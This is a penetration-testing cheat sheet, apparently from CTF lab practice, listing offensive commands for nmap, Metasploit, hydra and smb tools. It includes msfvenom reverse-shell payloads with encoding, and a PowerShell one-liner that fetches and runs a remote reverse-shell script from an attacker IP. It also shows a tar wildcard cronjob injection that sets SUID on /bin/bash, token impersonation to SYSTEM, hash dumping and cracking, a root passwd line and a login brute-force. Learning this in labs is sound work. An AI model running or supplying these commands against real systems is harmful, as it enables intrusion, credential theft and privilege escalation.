# Network Scanner (nmap)
1. nmap -sS	for stealth scan
1. nmap -sU	for UDP scan
1. nmap -O	for OS detection
1. nmap -sV	for Service version detection
1. nmap -vv	for extra verbosity
1. nmap -oA	for saving in three different formats
1. nmap -oN	for saving in a normal format
1. nmap -oG	for saving in grepable format
1. nmap -A	for aggresive mode
1. nmap -T5	for increase speed (noisy!)
1. nmap -p-	for scanning all ports
1. nmap -sn  not scan ports, forces icmp
1. nmap -sC	for running default scripts
1. /usr/share/nmap/scripts/   scripts location

# Gobuster
Check: gobuster -h
Gobuster can get additional seclists:
```
pacman -S seclists
```
To enumerate a URL target or IP:
```
gobuster dir -u <target> -w <wordlist>
```
Some optional flags:
-x  extensions
-U  username
-P  password
-s  status code, e.g 200,400,404,204
-k  skip ssl certificate verification
-a  specify User-Agent
-h  specify a HTTP header
-u  brute force URL:
```console
gobuster dir -u <URL> -w <wordlist> -x <extension> -U <username> -P <password>
```

# Nikto
Check if URL is vulnerable
```console
nikto -h <URL>
```

# msfconsole
Some useful commands:
info
options
advanced
set payload
set arch
exploit -j exploit in the background
session -i <number> to go to interactive mode

# To create a salted hash like in passwd
The openssl binary is used. Also the line in passwd has the following format
```console
openssl passwd -1 -salt <salt> <password>
username:passwordhash:0:0:root:/root:/bin/bash
```

#For Linux Enumeration after initial foothold
It is not vulnerability based, but more technical.
Download the LinEnum.sh from [LinEnumRepo](https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh)
```console
./LinEnum.sh
```
# Some useful commands for enumeration
First list all your sessions
```console
sessions 
```
Select the session that you wanna upgrade to meterpreter and run:
```console
sessions -u <number>
```
Another option is to use
```console
use post/multi/manage/shell_to_meterpreter
```

To choose get into the meterpreter session:
```console
sessions -i 2
```
Tip migration to spoolsv.exe (print service) is always advisable (due to stability)

To dump the hashes of Windows using the Meterpreter:
```console
hashdump
```

To crack the hash use:
```console
john john_hash --format=NT --wordlist=/usr/share/wordlist/rockyou.txt
```

To showed the cracked result:
```console
john john_hash --format=NT --show
```

To enumerate smb shares:
```console
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse <target_ip>
```

To enumerate file system:
```console
nmap -p <number> --script=nfs-ls,nfs-statfs,nfs-showmount <target_ip>
```

# SSH commands
To login with a particular private key
```console
ssh -i id_rsa <username>@<target_ip>
```

# Search commands
To look for SUID (suid) bits enable:
```console
find / -perm -u=s -type f 2>/dev/null
```

# Upgrade shell to meterpreter
```console
search multi/manage/shell_to_meterpreter
```

# Load and run powershell in meterpreter
```console
load powershell
powershell_shell
```

# To create a msfvenoms payload with meterpreter reverse shell
```console
msfvenom -p windows/meterpreter/reverse_tcp -a x86 --encoder x86/shikata_ga_nai LHOST=10.10.146.199 LPORT=4444 -f exe -o alfred.exe
```

# To download from a python server using powershell
```console
powershell iex (New-Object Net.WebClient).DownloadString('http://10.10.146.199:9000/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress 10.10.146.199 -Port 4343
```
or
```console
powershell Invoke-WebRequest -Uri http://10.8.30.155:1337/reverse.exe -Outfile reverse.exe
```

# To see privilege information in windows
```console
whoami /priv
```

# To impersonate other tokens using meterpreter
```console
load incognito
list_tokens -g
```

# To become NT system
```console
impersonate_token "BUILTIN\Administrators"
then migrate to a SYSTEM process (usually services.exe)
migrate <PID of services.exe>          
```

# Hydra brute force post
The http-post-form method require three arguments splitted by ":"
1. "Account/login.aspx", which you get from the URL 
2. "\_\_VIEWSTATE...Log+in", which you get using Burpsuite. Observe that you need also to insert ^USER^ and ^PASS^
3. Login Failed. Which is the most common case, deviations will be given as output.

```console
hydra - v -l admin -P /usr/share/wordlist/rockyou.txt <target_IP> http-post-form "/Account/login.aspx:__VIEWSTATE=i7MQNEYxCpsuWpX%2FARpaWiNDZbLxzhra5gcXSs0jSsiEg18uQztWWGsZy4ofbcUHTEqDrAnDifUKYN%2FCBdKAokaVydVNCiAwGHV4kPsIPzXP3xuFzYfOcCIDtBW0F7mNfw2AT%2BVl2rNLN4Cr8Ur9ReRZUq7%2BzU8yJjvGQcuanNcRj05P&__EVENTVALIDATION=wxH6yuXUPcWQy8HL%2F3WLAm2XyiAzbFlRZrMVEfPOK8DEZRYsARugOtVfq0q8lMKCsGX7%2BF0CdBZGVhwG97qfj%2FqoPwGgR9Hivgq8btr6BxRC28PmKpSu%2BlSYF36OVMJbTQ%2BmYqHRNXE44DKvaSrQ%2F9Ki%2F%2FQ%2FUC%2FW6fIzV7I7M5BQFijq&ctl00%24MainContent%24LoginUser%24UserName=^USER^&ctl00%24MainContent%24LoginUser%24Password=^PASS^&ctl00%24MainContent%24LoginUser%24LoginButton=Log+in:Login Failed"
```

# To check for a smb services and list of shares
```console
smbmap -H <target_IP>
```

# To download using smb protocol
A password is required with the option -U
```console
smbget -R smb://<target_ip>/<accessible_share> -U <user>
```

# To login to the smb share
A password is required
```console
smbclient //<target_IP>/<share> -U <user>
```

# To abuse wildcard * in cronjobs
The below code creates a shell.sh that would be executed abusing a cronjob and setting the SUID bit on the binary /bin/bash
```
printf '#!/bin/bash\nchmod +s /bin/bash' > shell.sh
echo "" > "--checkpoint-action=exec=sh shell.sh"
echo "" > --checkpoint=1
```

# Php meterpreter using msfvenom
```console
msfvenom -p php/meterpreter_reverse_tcp LHOST=<IP> LPORT=<PORT> -f raw > shell.php
```

